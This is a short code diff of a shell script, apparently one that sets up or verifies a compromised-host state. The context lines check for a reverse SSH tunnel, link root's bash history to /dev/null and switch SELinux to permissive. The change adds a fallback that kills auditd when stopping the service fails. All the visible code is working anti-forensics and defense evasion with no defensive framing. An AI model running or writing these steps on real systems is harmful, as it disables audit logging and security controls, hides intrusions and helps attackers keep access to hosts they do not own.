@@ -124,7 +124,8 @@ pgrep -f 'R 127.0.0.1:2222' >/dev/null || fail ssh-tunnel-running
 # Root's history sent to /dev/null.
 ln -sf /dev/null /root/.bash_history || fail history
 # auditd stopped (RHEL refuses `systemctl stop auditd`; `service` works).
-systemctl stop auditd 2>/dev/null || service auditd stop >/dev/null 2>&1 || fail auditd
+systemctl stop auditd 2>/dev/null || service auditd stop >/dev/null 2>&1 \
+    || kill -TERM "$(pidof auditd)" 2>/dev/null || fail auditd
 # SELinux to permissive (RHEL family), or AppArmor's profiles unloaded (Ubuntu).
 if command -v setenforce >/dev/null 2>&1 && [ -e /sys/fs/selinux/enforce ]; then
     setenforce 0 || fail selinux
